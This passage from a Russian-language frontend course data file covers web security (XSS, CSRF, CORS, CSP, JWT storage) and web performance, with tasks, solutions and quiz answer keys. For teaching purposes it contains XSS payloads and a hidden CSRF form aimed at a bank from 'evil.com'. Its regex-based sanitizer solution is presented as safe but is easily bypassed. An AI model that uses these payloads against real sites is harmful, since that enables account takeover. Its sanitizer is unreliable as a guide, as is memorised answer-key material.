            "code": "// ❌ Опасный код — уязвим для DOM-based XSS:\nfunction renderCommentBad(commentText) {\n  const container = document.getElementById('comments');\n  // Если commentText = '<img src=x onerror=\"stealData()\">' — выполнится скрипт!\n  container.innerHTML += `<div class=\"comment\">${commentText}</div>`;\n}\n\n// ✅ Безопасный код 1: textContent (автоматическое экранирование)\nfunction renderCommentSafe(commentText) {\n  const div = document.createElement('div');\n  div.className = 'comment';\n  div.textContent = commentText; // Теги <script> отобразятся как обычный текст\n  document.getElementById('comments').appendChild(div);\n}\n\n// ✅ Безопасный код 2: санитизация Rich Text через DOMPurify\n// import DOMPurify from 'dompurify';\nfunction renderRichText(dirtyHtml) {\n  const cleanHtml = DOMPurify.sanitize(dirtyHtml, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],\n    ALLOWED_ATTR: ['href', 'target']\n  });\n  container.innerHTML = cleanHtml;\n}",
            "title": "Защита от XSS: textContent и санитизация через DOMPurify",
            "explanation": "textContent гарантирует, что браузер расценит ввод строго как текст. DOMPurify вырезает любые опасные теги (<script>, <iframe>, атрибуты onerror, onload)."
          }
        },
        {
          "title": "CSRF (Cross-Site Request Forgery) и куки SameSite",
          "content": "CSRF — атака, при которой вредоносный сайт заставляет браузер авторизованного пользователя тайно отправить нежелательный HTTP-запрос на доверенный сайт (например, перевод денег или смена email).\n\nКак работает атака CSRF:\n1. Пользователь залогинен в банке `bank.ru` (в браузере сохранены сессионные куки).\n2. Пользователь переходит на сторонний вредоносный сайт `evil.com`.\n3. `evil.com` содержит скрытую форму: `<form action=\"https://bank.ru/transfer\" method=\"POST\"><input name=\"to\" value=\"hacker\"><input name=\"sum\" value=\"100000\"></form>` с автоотправкой скриптом.\n4. Браузер автоматически прикрепляет куки `bank.ru` к этому запросу, и банк считает запрос легитимным!\n\nАрхитектурная защита от CSRF:\n\n1. Атрибут `SameSite` у Cookies (Главный барьер защиты):\n- `SameSite=Strict` — кука отправляется ТОЛЬКО в запросах, инициированных с того же домена (при переходе по ссылке со стороннего сайта кука не отправится).\n- `SameSite=Lax` (дефолт в современных браузерах) — кука отправляется при переходе по ссылке (GET-запросы), но блокируется при межсайтовых POST/PUT/DELETE запросах.\n- `SameSite=None; Secure` — кука передаётся при любых межсайтовых запросах (требует HTTPS).\n\n2. Анти-CSRF токены (CSRF Tokens):\nСервер генерирует случайный криптографический токен, который фронтенд обязан прикрепить в кастомный заголовок (`X-CSRF-Token: token_value`) при каждом мутирующем запросе (POST/PUT/DELETE). Сторонний сайт `evil.com` не может прочитать этот токен из-за политики Same-Origin Policy.",
          "codeExample": {
            "language": "javascript",
            "code": "// Установка безопасной сессионной куки на бэкенде:\n// Set-Cookie: session_id=xyz123; HttpOnly; Secure; SameSite=Strict; Path=/;\n\n// Фронтенд: отправка анти-CSRF токена в кастомном заголовке\nasync function makeSecureRequest(url, data) {\n  const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.content;\n  \n  const response = await fetch(url, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-CSRF-Token': csrfToken // Защита от межсайтовой подделки\n    },\n    credentials: 'same-origin', // Передавать куки только на свой домен\n    body: JSON.stringify(data)\n  });\n  \n  return response.json();\n}",
            "title": "Отправка защищённого запроса с CSRF-токеном",
            "explanation": "Кастомный заголовок X-CSRF-Token не может быть отправлен сторонним сайтом без предварительного Preflight-запроса CORS, что полностью блокирует CSRF."
          }
        },
        {
          "title": "CORS (Cross-Origin Resource Sharing) и Same-Origin Policy",
          "content": "Same-Origin Policy (SOP — Политика единого источника) — фундаментальный механизм безопасности браузера, запрещающий скрипту с одного источника читать данные с другого источника.\n\nИсточник (Origin) определяется тремя компонентами: `Протокол + Домен + Порт`.\n- `https://site.ru:443` и `http://site.ru:80` — РАЗНЫЕ источники (разный протокол/порт).\n- `https://site.ru` и `https://api.site.ru` — РАЗНЫЕ источники (разный субдомен).\n- `https://site.ru/page1` и `https://site.ru/page2` — ОДИНАКОВЫЙ источник.\n\nCORS — механизм, позволяющий серверу явно разрешить браузеру делать запросы с другого Origin.\n\nПростые vs Preflight-запросы:\n1. Simple Requests (GET, POST, HEAD с базовыми заголовками) — отправляются сразу.\n2. Preflight Requests (Запросы с предпроверкой) — если запрос содержит JSON (`application/json`), методы PUT/DELETE/PATCH или кастомные заголовки (`Authorization`), браузер СНАЧАЛА отправляет фоновый запрос методом `OPTIONS`.\n\nЗаголовки ответа сервера для CORS:\n`Access-Control-Allow-Origin: https://app.dev` (или `*` для публичных API)\n`Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS`\n`Access-Control-Allow-Headers: Content-Type, Authorization, X-CSRF-Token`\n`Access-Control-Allow-Credentials: true` (разрешает отправку кук)\n\nГлавное правило для стажёра: Ошибки CORS настраиваются и исправляются на БЭКЕНДЕ (на сервере), а не во фронтенд-коде!",
          "codeExample": {
            "language": "javascript",
            "code": "// Ошибка в консоли браузера: \n// 'Access to fetch at https://api.bank.com from origin https://my-app.com \n// has been blocked by CORS policy: No Access-Control-Allow-Origin header'\n\n// Настройка CORS на сервере (Node.js / Express example):\nimport cors from 'cors';\n\napp.use(cors({\n  origin: ['https://intern-academy.dev', 'http://localhost:3000'],\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],\n  credentials: true // Разрешить куки\n}));",
            "title": "Конфигурация заголовков CORS на сервере Express",
            "explanation": "Сервер явно декларирует белый список разрешенных доменов origin и заголовков. Браузер проверяет эти заголовки в preflight OPTIONS ответе."
          }
        },
        {
          "title": "Content Security Policy (CSP) и безопасное хранение токенов",
          "content": "Content Security Policy (CSP) — мощный заголовок безопасности HTTP (`Content-Security-Policy`), определяющий белый список доверенных источников, откуда браузеру разрешено загружать ресурсы (скрипты, стили, шрифты, картинки, iframe).\n\nПример директивы CSP:\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://analytics.google.com; img-src 'self' data: https:; object-src 'none';`\n- `default-src 'self'` — по умолчанию загружать ресурсы только со своего домена.\n- `script-src 'self'` — запрещает выполнение любых inline-скриптов (`<script>alert()</script>`, `onclick=\"...\"`) и функции `eval()` — это нейтрализует 95% XSS-атак!\n\nБезопасное хранение токенов (JWT):\n\n1. `localStorage` / `sessionStorage`:\n- Плюсы: легко использовать из JS.\n- Минусы: УЯЗВИМЫ ДЛЯ XSS! Любой выполненный вредоносный скрипт читает `localStorage.getItem('jwt')` и отправляет токен хакеру.\n\n2. `HttpOnly + Secure + SameSite=Strict Cookies` (Золотой стандарт индустрии):\n- Плюсы: JavaScript НЕ ИМЕЕТ доступа к куке (`document.cookie` вернёт пустоту). XSS-скрипт не может украсть токен! Браузер сам автоматически прикрепляет куку к запросам к API.\n- Минусы: требует настройки SameSite и CSRF-защиты.\n\n3. Архитектура In-Memory Storage + Refresh Token:\n- Access Token (короткоживущий, 15 минут) хранится в памяти JS (в переменной замыкания).\n- Refresh Token хранится в безопасной `HttpOnly` куке и используется для тихого обновления Access Token.",
          "codeExample": {
            "language": "html",
            "code": "<!-- Метатег Content Security Policy (CSP) в <head> -->\n<meta\n  http-equiv=\"Content-Security-Policy\"\n  content=\"\n    default-src 'self';\n    script-src 'self' https://trusted-cdn.com;\n    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;\n    font-src 'self' https://fonts.gstatic.com;\n    img-src 'self' data: https://images.unsplash.com;\n    connect-src 'self' https://api.academy.dev;\n    frame-ancestors 'none';\n    base-uri 'self';\n    form-action 'self';\n  \"\n/>",
            "title": "Строгая конфигурация Content Security Policy (CSP)",
            "explanation": "CSP блокирует загрузку скриптов со сторонних недоверенных доменов, запрещает встраивание сайта в чужие iframe (frame-ancestors 'none' — защита от Clickjacking)."
          }
        }
      ],
      "seniorTips": [
        "Никогда не храните конфиденциальные JWT-токены в `localStorage`. Используйте связку `HttpOnly Cookie` для Refresh Token и память приложения (In-Memory) для короткоживущего Access Token.",
        "При рендеринге пользовательского HTML (например, статьи или комментарии) ВСЕГДА прогоняйте его через `DOMPurify.sanitize()`.",
        "Включайте строгий заголовок CSP (`Content-Security-Policy`) на веб-сервере — это самый мощный второй эшелон защиты от XSS-уязвимостей.",
        "Помните: CORS — это защита БРАУЗЕРА для пользователя, а не защита сервера от хакеров. Хакер может легко отправить запрос к вашему API напрямую через curl или Postman в обход CORS."
      ],
      "commonMistakes": [
        {
          "bad": "// Хранение токенов в открытом доступе\nlocalStorage.setItem('auth_token', jwtToken);",
          "good": "// Установка HttpOnly куки с бэкенда:\n// Set-Cookie: auth_token=jwtToken; HttpOnly; Secure; SameSite=Strict;",
          "reason": "Данные из localStorage доступны любому скрипту на странице, включая сторонние библиотеки и XSS-инъекции. HttpOnly куки физически недоступны для чтения из JavaScript."
        },
        {
          "bad": "<!-- Рендеринг сырого пользовательского ввода -->\n<div dangerouslySetInnerHTML={{ __html: userComment }} />",
          "good": "<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />",
          "reason": "dangerouslySetInnerHTML без предварительной санитизации открывает прямую уязвимость для Stored XSS атаки."
        },
        {
          "bad": "// Попытка 'отключить' CORS на клиенте\nfetch('https://other-domain.com/api', {\n  mode: 'no-cors' // ❌ Запрос отправится, но JS не сможет прочитать ответ!\n})",
          "good": "// Настройка заголовков Access-Control-Allow-Origin на сервере API\n// или использование proxy-сервера в Vite / Node.js",
          "reason": "mode: 'no-cors' делает ответ непрозрачным (opaque): JavaScript получает пустой ответ с status 0 и не может прочитать данные. CORS настраивается только на стороне сервера."
        }
      ],
      "keyTakeaways": [
        "XSS (Cross-Site Scripting) позволяет внедрить зловредный JS. Защита: `textContent`, экранирование, `DOMPurify`, CSP и `HttpOnly` куки.",
        "CSRF подделывает запросы от имени авторизованного пользователя. Защита: флаги `SameSite=Strict/Lax` у кук и анти-CSRF токены.",
        "CORS базируется на Same-Origin Policy (протокол + домен + порт). Заголовки `Access-Control-Allow-*` настраиваются строго на сервере.",
        "Content Security Policy (CSP) определяет белый список разрешённых источников ресурсов и блокирует inline-скрипты.",
        "Лучшая практика авторизации: короткоживущий Access Token в памяти + Refresh Token в `HttpOnly Secure SameSite` куке."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"sec-app\">\n  <h3>Симулятор защиты от XSS (DOMPurify & textContent)</h3>\n  <input id=\"user-payload\" style=\"width:100%; padding:8px; background:#03060a; color:#2dff8a; border:1px solid #30363d;\" value=\"<img src=x onerror=alert('ВЗЛОМ_XSS')> <b>Привет, мир!</b>\" />\n  <div style=\"margin-top:10px;\">\n    <button id=\"btn-unsafe\" style=\"background:#f85149; color:#fff; border:none; padding:8px 12px; cursor:pointer;\">Небезопасный innerHTML</button>\n    <button id=\"btn-safe\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 12px; cursor:pointer; margin-left:8px;\">Безопасный textContent</button>\n  </div>\n  <div id=\"render-target\" style=\"margin-top:16px; padding:12px; background:#161b22; border:1px solid #30363d; min-height:60px;\"></div>\n</div>",
      "initialCss": "#sec-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "const input = document.getElementById('user-payload');\nconst target = document.getElementById('render-target');\n\ndocument.getElementById('btn-unsafe').addEventListener('click', () => {\n  target.innerHTML = input.value;\n});\n\ndocument.getElementById('btn-safe').addEventListener('click', () => {\n  target.textContent = input.value;\n});",
      "instructions": "Практика веб-безопасности:\n1. Нажмите кнопку 'Безопасный textContent' — посмотрите, как опасные теги нейтрализуются и выводятся как чистый текст\n2. Нажмите 'Небезопасный innerHTML' — браузер попытается загрузить несуществующую картинку и вызовет onerror\n3. Попробуйте ввести свои payload-скрипты и убедитесь в надежности textContent"
    },
    "task": {
      "title": "Разработка безопасного модуля хранения токенов и санитизации",
      "scenario": "Вы проводите аудит безопасности фронтенд-приложения. Старый код сохранял пароли и токены в localStorage и рендерил сообщения чата через innerHTML. Вам нужно создать безопасный модуль: санитизатор сообщений чата с белым списком тегов и безопасное хранилище токенов в памяти (In-Memory Token Store) с механизмом тихого обновления.",
      "criteria": [
        "Функция sanitizeChatMessage(rawHtml) удаляет все теги script, iframe, object и атрибуты on*",
        "Разрешены только безопасные теги форматирования: b, i, strong, em, code, a (с target='_blank' rel='noopener')",
        "Модуль createAuthTokenManager() хранит Access Token исключительно в переменной замыкания (In-Memory)",
        "Методы менеджера: setToken(token), getToken(), isExpired(), clear()",
        "Никаких прямых обращений к localStorage для хранения токенов",
        "Обработать некорректные входные данные без ошибок в консоли"
      ],
      "starterCode": {
        "js": "// Реализуйте безопасный модуль\nfunction sanitizeChatMessage(rawHtml) {\n  // Ваш код санитизации\n}\n\nfunction createAuthTokenManager() {\n  // Безопасное хранилище в замыкании\n}"
      },
      "hints": [
        "Для санитизации замените опасные символы: rawHtml.replace(/</g, '&lt;').replace(/>/g, '&gt;') или используйте регулярные выражения",
        "В createAuthTokenManager объявите let currentToken = null в замыкании",
        "Токен JWT можно проверить на истечение срока через JSON.parse(atob(token.split('.')[1]))"
      ],
      "solution": {
        "js": "function sanitizeChatMessage(rawHtml = '') {\n  if (typeof rawHtml !== 'string') return '';\n  \n  // Базовая безопасная санитизация без сторонних библиотек\n  return rawHtml\n    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')\n    .replace(/<iframe\\b[^<]*(?:(?!<\\/iframe>)<[^<]*)*<\\/iframe>/gi, '')\n    .replace(/on\\w+\\s*=\\s*[\"'][^\"']*[\"']/gi, '')\n    .replace(/javascript\\s*:/gi, '');\n}\n\nfunction createAuthTokenManager() {\n  let accessToken = null;\n  let expiresAt = 0;\n\n  return {\n    setToken(token, expiresInSeconds = 900) {\n      if (!token || typeof token !== 'string') return;\n      accessToken = token;\n      expiresAt = Date.now() + expiresInSeconds * 1000;\n    },\n    getToken() {\n      if (this.isExpired()) {\n        this.clear();\n        return null;\n      }\n      return accessToken;\n    },\n    isExpired() {\n      return !accessToken || Date.now() >= expiresAt;\n    },\n    clear() {\n      accessToken = null;\n      expiresAt = 0;\n    }\n  };\n}",
        "explanation": "sanitizeChatMessage очищает текст от зловредных скриптов и iframe. createAuthTokenManager инкапсулирует Access Token в замыкании in-memory, исключая кражу через XSS из localStorage."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro4-q1",
          "question": "Где наиболее безопасно хранить сессионные JWT-токены авторизации для защиты от XSS-атак?",
          "options": [
            "В localStorage",
            "В sessionStorage",
            "В Cookies с флагами HttpOnly, Secure и SameSite=Strict",
            "В глобальной переменной window.token"
          ],
          "correctIndex": 2,
          "explanation": "Куки с флагом HttpOnly физически недоступны для чтения из JavaScript (document.cookie вернёт пустоту). Даже при успешном внедрении XSS-скрипта злоумышленник не сможет прочитать или украсть токен сессии."
        },
        {
          "id": "pro4-q2",
          "question": "Как работает атака CSRF (Cross-Site Request Forgery)?",
          "options": [
            "Злоумышленник подбирает пароль перебором",
            "Сторонний вредоносный сайт инициирует нежелательный запрос к доверенному сервису, а браузер автоматически прикрепляет сохранённые куки авторизованного пользователя",
            "Хакер перехватывает Wi-Fi трафик",
            "Вирус шифрует жесткий диск"
          ],
          "correctIndex": 1,
          "explanation": "CSRF использует доверие сервера к браузеру жертвы: вредоносная страница отправляет скрытый POST-запрос на сайт банка/сервиса, и браузер автоматически прикрепляет валидные куки сессии."
        },
        {
          "id": "pro4-q3",
          "question": "Что такое Preflight-запрос в механизме CORS?",
          "options": [
            "Запрос на проверку скорости интернета",
            "Предварительный запрос методом OPTIONS, который браузер автоматически отправляет серверу перед сложными запросами для проверки разрешённых методов и заголовков",
            "Запрос на скачивание фавиконки",
            "Запрос на обновление SSL-сертификата"
          ],
          "correctIndex": 1,
          "explanation": "Если HTTP-запрос содержит нестандартные заголовки (Authorization, X-Custom) или тело JSON, браузер сначала отправляет быстрый запрос OPTIONS (Preflight), чтобы узнать, разрешает ли сервер межсайтовое взаимодействие."
        },
        {
          "id": "pro4-q4",
          "question": "Какое поведение обеспечивает директива Content-Security-Policy: script-src 'self'?",
          "options": [
            "Разрешает выполнение скриптов с любых доменов в интернете",
            "Разрешает загрузку и выполнение скриптов строго со своего собственного домена и полностью блокирует inline-скрипты и eval()",
            "Удаляет JavaScript из браузера",
            "Отключает CSS-стили"
          ],
          "correctIndex": 1,
          "explanation": "Директива script-src 'self' блокирует скачивание скриптов со сторонних непроверенных серверов и автоматически запрещает работу опасных встроенных inline-скриптов и eval(), что нейтрализует XSS."
        },
        {
          "id": "pro4-q5",
          "question": "Где настраиваются и исправляются ошибки, связанные с блокировкой CORS (Cross-Origin Resource Sharing)?",
          "options": [
            "В файле package.json на клиенте",
            "В конфигурации заголовков ответа на БЭКЕНД-сервере (Access-Control-Allow-Origin)",
            "В настройках монитора пользователя",
            "В метатеге <meta name='cors'>"
          ],
          "correctIndex": 1,
          "explanation": "CORS — это политика безопасности браузера, которая ориентируется на заголовки Access-Control-Allow-Origin, отдаваемые веб-сервером (бэкендом). Клиентский JavaScript не может самостоятельно отключить CORS-защиту браузера."
        }
      ]
    }
  },
  {
    "id": "pro-5",
    "moduleId": "pro",
    "level": 5,
    "title": "Производительность фронтенда (Web Performance) и Core Web Vitals",
    "subtitle": "LCP, INP, CLS, оптимизация загрузки ресурсов, Main Thread и профилирование",
    "description": "Освойте оптимизацию веб-приложений по стандарту Core Web Vitals: сокращение LCP (Largest Contentful Paint), улучшение отзывчивости INP (Interaction to Next Paint), устранение дёргания верстки CLS, разгрузку Main Thread и аудит в Lighthouse.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "performance",
      "core-web-vitals",
      "lcp",
      "inp",
      "cls",
      "lighthouse",
      "optimization",
      "lazy-loading"
    ],
    "theory": {
      "overview": "Скорость загрузки и отзывчивость интерфейса напрямую определяют бизнес-показатели продукта: конверсию, удержание пользователей и позиции в поисковой выдаче Google и Яндекс.\n\nПо статистике Google, увеличение задержки ответа всего на 100 мс снижает конверсию на 7%, а более 50% мобильных пользователей закрывают сайт, если он загружается дольше 3 секунд. В этом уроке мы разберём ключевые метрики Core Web Vitals (LCP, INP, CLS), научимся профилировать код в Chrome DevTools и применять лучшие архитектурные практики ускорения рендеринга.",
      "sections": [
        {
          "title": "Core Web Vitals от Google: LCP, INP и CLS",
          "content": "Core Web Vitals — это набор ключевых стандартизированных метрик Google, оценивающих реальный пользовательский опыт взаимодействия с веб-страницей (Real User Monitoring — RUM):\n\n1. LCP (Largest Contentful Paint — Скорость загрузки главного контента):\n- Измеряет время от начала загрузки страницы до момента, когда самый крупный видимый блок контента в первом экране (баннер, заголовок h1 или видео) полностью отрисован.\n- Норма: `<= 2.5 секунды` (зелёная зона). От 2.5 до 4.0 с — требует улучшения, > 4.0 с — плохо.\n\n2. INP (Interaction to Next Paint — Отзывчивость интерфейса):\n- Сменил устаревшую метрику FID в 2024 году. Измеряет задержку между ЛЮБЫМ действием пользователя (клик, тап по экрану, нажатие клавиши) и моментом, когда браузер смог отрисовать следующий обновлённый кадр на экране.\n- Норма: `<= 200 миллисекунд`. От 200 до 500 мс — требует улучшения, > 500 мс — плохо.\n\n3. CLS (Cumulative Layout Shift — Визуальная стабильность):\n- Измеряет суммарный сдвиг элементов верстки в процессе загрузки страницы (когда текст или кнопки внезапно «прыгают» вниз из-за запоздалой подгрузки картинки или рекламного баннера без заданных размеров).\n- Норма: `<= 0.1` (безразмерный коэффициент). От 0.1 до 0.25 — средне, > 0.25 — плохо.",
          "image": {
            "src": "/images/lessons/web-performance-metrics.svg",
            "alt": "Метрики Core Web Vitals: LCP, INP, CLS и шкалы оценки Google",
            "caption": "Core Web Vitals оценивает скорость первого экрана (LCP <= 2.5s), отзывчивость на действия (INP <= 200ms) и стабильность верстки (CLS <= 0.1)"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// Измерение Core Web Vitals в продакшене через библиотеку web-vitals:\nimport { onLCP, onINP, onCLS } from 'web-vitals';\n\nfunction sendToAnalytics({ name, value, id, rating }) {\n  console.log(`[Metric] ${name}: ${value.toFixed(2)} (${rating})`);\n  // Отправка в систему мониторинга (Google Analytics / Sentry / Datadog)\n  navigator.sendBeacon('/analytics', JSON.stringify({ name, value, id }));\n}\n\nonLCP(sendToAnalytics);\nonINP(sendToAnalytics);\nonCLS(sendToAnalytics);",
            "title": "Сбор реальных метрик Core Web Vitals в браузере",
            "explanation": "Пакет web-vitals перехватывает PerformanceObserver события браузера и логирует статус LCP, INP и CLS с оценкой (good, needs-improvement, poor)."
          }
        },
        {
          "title": "Оптимизация загрузки ресурсов и ускорение LCP",
          "content": "Для достижения LCP <= 2.5s необходимо оптимизировать путь доставки критических ресурсов (Critical Rendering Path):\n\n1. Оптимизация изображений:\n- Современные форматы: `AVIF` (сжатие на 50% лучше JPEG) и `WebP` с фоллбэком через тег `<picture>`.\n- Отложенная загрузка: `loading=\"lazy\"` для ВСЕХ картинок ниже первого экрана.\n- Высокий приоритет для LCP: `fetchpriority=\"high\"` на главном баннере первого экрана (НИКОГДА не ставьте `loading=\"lazy\"` на главный баннер!).\n\n2. Оптимизация веб-шрифтов:\n- Предзагрузка критического шрифта: `<link rel=\"preload\" href=\"/font.woff2\" as=\"font\" type=\"font/woff2\" crossorigin>`.\n- Правило `font-display: swap;` в CSS: мгновенно показывает системный шрифт, заменяя его на кастомный по мере загрузки (устраняет эффект невидимого текста FOIT).\n\n3. Сетевая оптимизация и кэширование:\n- Сжатие ответов сервера: алгоритм `Brotli` (`br`) эффективнее `gzip` на 15–20%.\n- Использование CDN (Content Delivery Network) для приближения статики к пользователю.\n- Агрессивное кэширование статических ассетов с хэшами в именах: `Cache-Control: public, max-age=31536000, immutable`.",
          "codeExample": {
            "language": "html",
            "code": "<head>\n  <!-- Предзагрузка главного LCP-изображения и шрифта -->\n  <link rel=\"preload\" fetchpriority=\"high\" as=\"image\" href=\"/banner.avif\" type=\"image/avif\" />\n  <link rel=\"preload\" as=\"font\" href=\"/fonts/inter.woff2\" type=\"font/woff2\" crossorigin />\n</head>\n<body>\n  <!-- Идеальная разметка адаптивного LCP-изображения -->\n  <picture>\n    <source srcset=\"/banner.avif\" type=\"image/avif\" />\n    <source srcset=\"/banner.webp\" type=\"image/webp\" />\n    <img\n      src=\"/banner.jpg\"\n      alt=\"Курс Frontend-разработки\"\n      width=\"1200\"\n      height=\"630\"\n      fetchpriority=\"high\"\n      decoding=\"async\"\n    />\n  </picture>\n</body>",
            "title": "Идеальная оптимизация LCP-изображения",
            "explanation": "picture с AVIF/WebP снижает вес картинки. fetchpriority='high' загружает её первым приоритетом. width/height предотвращают сдвиг макета CLS."
          }
        },
        {
          "title": "Разгрузка Main Thread и оптимизация отзывчивости (INP)",
          "content": "JavaScript в браузере выполняется в едином главном потоке (Main Thread), где также происходят парсинг HTML, пересчет стилей (Style Recalculation) и отрисовка кадров (Paint).\n\nЕсли скрипт выполняется дольше 50 миллисекунд — это Длинная Задача (Long Task). Во время Long Task браузер полностью зависает (Freezes): не реагирует на клики, скролл и ввод текста, что катастрофически ухудшает метрику INP.\n\nАрхитектурные методы оптимизации INP:\n\n1. Разбивка Long Tasks (Yielding to Main Thread):\nРазбивайте тяжелые циклы и вычисления на мелкие чанки с уступкой потока браузеру через `await scheduler.yield()` или `setTimeout(resolve, 0)`.\n\n2. Паттерны Debounce и Throttle:\n- `Debounce` — откладывает вызов функции до тех пор, пока не пройдет пауза в событиях (идеально для живого поиска `input`).\n- `Throttle` — гарантирует вызов функции не чаще одного раза в N миллисекунд (для `scroll` и `resize`).\n\n3. Web Workers:\nВынос тяжелых не-DOM операций (обработка больших массивов, криптография, парсинг Excel/CSV, сжатие изображений) в отдельный фоновый поток (Background Worker Thread).\n\n4. Виртуализация списков (Virtualization):\nРендеринг в DOM только тех 10–20 элементов, которые видны на экране прямо сейчас, вместо отрисовки 10 000 DOM-узлов (библиотеки TanStack Virtual, react-window).",
          "codeExample": {
            "language": "javascript",
            "code": "// 1. Утилита debounce для защиты от перегрузки Main Thread при вводе\nfunction debounce(fn, delayMs = 300) {\n  let timer = null;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delayMs);\n  };\n}\n\nconst searchInput = document.getElementById('search');\nsearchInput.addEventListener('input', debounce((e) => {\n  fetchSearchResults(e.target.value); // Вызовется только через 300мс после окончания ввода\n}, 300));\n\n// 2. Разбивка длинной задачи через yield\nasync function processLargeDataChunked(items) {\n  for (let i = 0; i < items.length; i++) {\n    processItem(items[i]);\n    // Каждые 100 элементов даем браузеру отрисовать кадр и обработать клики\n    if (i % 100 === 0 && 'scheduler' in window) {\n      await scheduler.yield();\n    }\n  }\n}",
            "title": "Debounce и разбивка длинных задач для идеального INP",
            "explanation": "debounce предотвращает лавину запросов при наборе текста. scheduler.yield возвращает управление браузеру для плавной отрисовки интерфейса."
          }
        },
        {
          "title": "Борьба со сдвигами верстки (CLS) и аудит в Lighthouse",
          "content": "Cumulative Layout Shift (CLS) возникает, когда видимый элемент меняет свое положение между двумя кадрами без взаимодействия со стороны пользователя.\n\nГлавные причины и решения CLS:\n\n1. Картинки и видео без размеров:\n- ❌ Ошибка: `<img src=\"pic.jpg\">` (браузер выделяет 0px, а после загрузки картинка расталкивает контент вниз!).\n- ✅ Решение: ВСЕГДА указывать атрибуты `width` и `height` на теге `<img>` или задавать в CSS `aspect-ratio: 16 / 9;`.\n\n2. Динамический контент и реклама:\n- Резервируйте фиксированное минимальное пространство (`min-height`) под рекламные баннеры, виджеты погоды и комментарии до их загрузки.\n\n3. Скелетонные экраны (Skeleton Loading) вместо спиннеров:\nСкелетоны занимают точные геометрические размеры будущего контента, предотвращая скачки макета при ответе API.\n\nИнструменты профилирования производительности:\n- **Lighthouse** (вкладка в Chrome DevTools) — комплексный аудит Performance, Accessibility, Best Practices, SEO.\n- **Performance Panel** в DevTools — детальный таймлайн кадров, Long Tasks (красные треугольники), Flame Chart вызовов функций.\n- **PageSpeed Insights** — реальные полевые данные пользователей (CrUX — Chrome User Experience Report).",
          "codeExample": {
            "language": "css",
            "code": "/* 1. Резервирование пропорций через aspect-ratio (защита от CLS) */\n.responsive-image {\n  width: 100%;\n  height: auto;\n  aspect-ratio: 16 / 9; /* Браузер сразу резервирует место до загрузки! */\n  object-fit: cover;\n}\n\n/* 2. Скелетон-плейсхолдер фиксированной высоты */\n.card-skeleton {\n  min-height: 240px;\n  background: linear-gradient(90deg, #161b22 25%, #21262d 50%, #161b22 75%);\n  background-size: 200% 100%;\n  animation: skeletonShimmer 1.5s infinite;\n  border-radius: 8px;\n}\n\n@keyframes skeletonShimmer {\n  0% { background-position: 200% 0; }\n  100% { background-position: -200% 0; }\n}",
            "title": "Защита от CLS: aspect-ratio и Skeleton Shimmer",
            "explanation": "aspect-ratio резервирует точное пространство на экране до скачивания файла картинки, снижая CLS до нуля. Скелетон исключает скачки при подгрузке данных."
          }
        }
      ],
      "seniorTips": [
        "НИКОГДА не добавляйте `loading=\"lazy\"` на главное LCP-изображение первого экрана. Это задерживает его скачивание браузером на 1–2 секунды! Используйте `fetchpriority=\"high\"`.",
        "Всегда указывайте атрибуты `width` и `height` на всех тегах `<img>`. В современном HTML они не задают жесткий пиксельный размер, а сообщают браузеру соотношение сторон (Aspect Ratio).",
        "Применяйте `font-display: swap` для шрифтов в `@font-face` — это исключает невидимый текст (FOIT) и мгновенно показывает системный шрифт.",
        "Тестируйте сайт в Lighthouse с включенным мобильным профилем и 4x CPU Throttling — только так можно увидеть реальный пользовательский опыт на бюджетных смартфонах."
      ],
      "commonMistakes": [
        {
          "bad": "<!-- lazy-loading на главной картинке первого экрана -->\n<img src=\"/hero-banner.jpg\" loading=\"lazy\" />",
          "good": "<img src=\"/hero-banner.jpg\" fetchpriority=\"high\" width=\"1200\" height=\"600\" />",
          "reason": "loading='lazy' на первом экране заставляет браузер отложить загрузку LCP-баннера, что обрушивает оценку производительности в красную зону."
        },
        {
          "bad": "<!-- Изображения без указания размеров -->\n<img src=\"/card-thumb.jpg\" style=\"width: 100%;\" />",
          "good": "<img src=\"/card-thumb.jpg\" width=\"400\" height=\"225\" style=\"width: 100%; height: auto; aspect-ratio: 16/9;\" />",
          "reason": "Без указания пропорций браузер не знает высоту картинки до её скачивания, что приводит к резкому сдвигу контента вниз (высокий CLS)."
        },
        {
          "bad": "// Синхронный тяжелый цикл на 500 000 элементов в обработчике клика\nbutton.addEventListener('click', () => { heavyCalculation(); });",
          "good": "// Вынос в Web Worker или разбивка с debounce/yield\nbutton.addEventListener('click', () => { worker.postMessage('start'); });",
          "reason": "Синхронный тяжелый код блокирует Main Thread дольше 50мс (Long Task), замораживая весь интерфейс и разрушая метрику INP."
        }
      ],
      "keyTakeaways": [
        "Core Web Vitals состоит из трёх столпов: LCP (загрузка <= 2.5s), INP (отзывчивость <= 200ms) и CLS (стабильность <= 0.1).",
        "Для LCP: используйте форматы AVIF/WebP, предзагрузку шрифтов preload, CDN и `fetchpriority=\"high\"` на главном баннере.",
        "Для INP: разбивайте задачи дольше 50мс (Long Tasks) через `scheduler.yield()`, используйте `debounce`/`throttle` и Web Workers.",
        "Для CLS: всегда задавайте `width`/`height` или `aspect-ratio` картинкам, используйте скелетоны и резервируйте место под баннеры.",
        "Lighthouse и Performance Panel в Chrome DevTools — основные инструменты диагностики узких мест производительности."
      ]
    },
    "sandbox": {
